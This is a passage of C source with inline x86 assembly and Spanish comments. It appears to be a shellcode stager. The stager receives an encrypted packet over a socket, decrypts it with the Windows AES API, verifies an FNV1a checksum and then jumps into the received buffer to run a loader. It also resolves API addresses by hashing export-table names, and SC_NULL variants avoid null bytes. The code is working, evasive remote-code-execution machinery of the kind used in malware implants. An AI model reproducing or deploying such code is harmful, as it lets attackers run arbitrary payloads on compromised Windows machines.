        DEBUG_MSG("sRESET")
        push [ebp+_hSocket]             //v
#ifdef SC_NULL
        mov  eax, ebp
        call [eax]
#else
        call [ebp+_closesocket]         //>closesocket(hSocket);
#endif
        jmp  newSocket                  //Creamos un nuevo socket

        /*###############################################################################
        ** Descifrado y autentificación:
        **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
        **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
        **    Luego, para evitar ejecutar código erróneo comprobamos el checksum
        *###############################################################################*/

init_decrypt:
        DEBUG_MSG("sRECV", ["eax"])
        DEBUG_MSG("sICRYPT")
        //Adquirimos el handle para trabajar con el CSP deseado.
        cdq                             //EDX = 0
#ifdef SC_NULL
        push 0x0F                       //v
        shl  DWORD PTR[esp], 0x1C       //v
#else //SC_NULL
        push CRYPT_VERIFYCONTEXT        //v
#endif //SC_NULL
        push PROV_RSA_AES               //v
        push edx                        //v
        push edx                        //v
        push ebp                        //v
        add  DWORD PTR[esp], _hProv     //v
        call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

        //Importamos la clave
        cdq                             //EDX = 0
        push ebp                        //v
        add  DWORD PTR[esp], _hKey      //v Dirección a la variable que contendrá el Handler a la key
        push edx                        //v
        push edx                        //v
        push 0x1C                       //v sizeof(aes128Blob)
        push [ebp+_pKEY]                //v Estructura que contiene la clave exportada
        push [ebp+_hProv]               //v
        call [ebp+_CryptImportKey]      //>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);

        //Establecemos el valor del IV(Initialization Vector)
        cdq                             //EDX = 0
        push edx                        //v
        push [ebp+_pBuff]               //v
        push KP_IV                      //v
        push [ebp+_hKey]                //v
        call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);

        //Restamos el IV a los datos
        sub  DWORD PTR[ebp+_buffLen], 16//buffLen-= 16
        push [ebp+_buffLen]             //Guardamos SizeOfPayLoad+4

        //Finalmente desciframos los datos obtenidos
        //Los datos se encuentran en el paquete así: IV(16Bytes)+DataEncrypt

        cdq                             //EDX = 0

        mov  esi, [ebp+_pBuff]          //ESI = pBuff = &IV
        add  esi, 16                    //ESI = &Checksum
        push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer

        push esp                        //v
        push esi                        //v
        push edx                        //v
        push 1                          //v
        push edx                        //v
        push [ebp+_hKey]                //v
        call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, True, 0, pBuff, &buffLen);

        DEBUG_MSG("sECRYPT")

        pop  edx                        //Descartamos la variable temporal
        pop  ecx                        //Recuperamos SizeOfPayload+4
        test eax, eax                   //v
        jz   KillSocket                 //(EAX==0)? Si EAX es cero es que no se ha descifrado correctamente.
                                        // Posiblemente la cantidad recibida no sea multiple de 16
        /*###############################################################################
        ** Comprobación del checksum:
        **    El checksum esta en +16 de los datos recibidos.
        **    El algoritmo utilizado para calcular el checksum es:
        **        *FNV1a (http://goo.gl/1A7ir)
        **    (Elegido por una buena relación tamaño-calidad)
        *###############################################################################*/

        sub  ecx, 4                     //ECX = SizePayload
        mov  ebx, [esi]                 //EBX = CheckSum

        DEBUG_MSG("sHASH", ["ecx", "ebx"])

        add  esi, 4                     //ESI+= 4 (saltamos checksum)
        cdq                             //hash = 0
FNV1a:
        lodsb                           //al = str[i]; i++;
        xor  dl, al                     //>hash ^= str[i];
        imul edx, 0x1EF30EB             //>hash *= 0x1EF30EB;
        loop FNV1a                      //>(len--);(len < 0)?

        cmp  edx, ebx
        jne  KillSocket                 //>(EDX==checksum?)

        DEBUG_MSG("sOK")

        push [ebp+_hKey]                //v
        push [ebp+_hSocket]             //v
        push [ebp+_LoadLibraryA]        //v
        mov  eax, [ebp+_pBuff]          //v
        add  eax, 0x14                  // Saltamos hasta el loader
        DEBUG_MSG("sEJEC", ["eax"])
        call eax                        //>loader(&LoadLibraryA, hSocket, &KEY);

        //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
        jmp KillSocket                  //Reiniciamos el bucle de espera
    }
}

/*###############################################################################
** LoadFunctions:
**  Método encargado de rellenar el stack de direcciones.
**  Llama a la función FindFunction() por cada hash en la lista
**  almacenando la dirección en su respectiva posición del stack.
**  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
*###############################################################################*/
void __declspec(naked) LoadFunctions(DWORD numHashes){
    __asm{
        push edi
        push ecx
        mov  ecx, [esp+0xC]             //ECX = numHashes
        //ESI = &lpHashes
        mov  edx, eax                   //EDX = &IMAGE_DOS_HEADER
        mov  edi, ebp

nextFunction:
        lodsw                           //mov ax, WORD[esi]; esi+=2
#pragma region FindFunction
/*###############################################################################
** FindFunction:
**    Función que recorre la EAT de una DLL en busca de cierta función.
**    Para ello genera un hash del nombre de la función y lo compara con el recibido.
**    Para más información revisar 'macros.h'
*###############################################################################*/
find_function:
        pushad
        //EDX = &IMAGE_DOS_HEADER
        mov  edi, [edx+0x3C]            //EDI = IMAGE_DOS_HEADER.e_lfanew
        mov  edi, [edx+edi+0x78]        //EDI = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
        add  edi, edx                   //EDI = EAT (RVA)
        mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
        mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
#ifdef SC_NULL
        inc  edx                        //EDX++;
#endif //SC_NULL
        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
find_function_loop:
#ifdef SC_NULL
        mov  esi, [ebp+ecx*4-5]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
        dec  esi
#else //SC_NULL
        mov  esi, [ebp+ecx*4-4]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
#endif //SC_NULL
        add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
        xor  ebx, ebx                   //EBX = 0
        push eax
compute_hash_again:
        xor  eax, eax                   //EAX = 0
        lodsb                           //AL = BYTE[ESI];ESI++
        test al, al                     //v
        jz   compute_hash_finished      //>(AL==0)? Fin del LibName
        imul eax, al                    //v
        xor  ebx, eax                   //>hash ^= (char[i]*char[i])
        jmp  compute_hash_again
compute_hash_finished:
        pop  eax
        cmp  bx, ax                     //v
        loopne find_function_loop       //>(BX == FunctionHash)&(ECX>0)?
        mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
#ifdef SC_NULL
        mov  cx, [ebp+ecx*2-1]
#else //SC_NULL
        mov  cx, [ebp+ecx*2]
#endif //SC_NULL
        mov  ebp, [edi+0x1C]
        add  ebp, edx
#ifdef SC_NULL
        mov  eax, [ebp+4*ecx-1]
        dec  eax
#else //SC_NULL
        mov  eax, [ebp+4*ecx]
#endif //SC_NULL

        add  eax, edx
find_function_finished:
        mov  [esp+0x1C], eax
        popad
#pragma endregion AX=HASH;EDX=BaseAddr

        //Guardamos dirección en buffer pila
        stosd
        loop nextFunction               //(ECX--);(ECX!=0)?
        mov  ebp, edi
        pop  ecx
        pop  edi
        ret
    }
}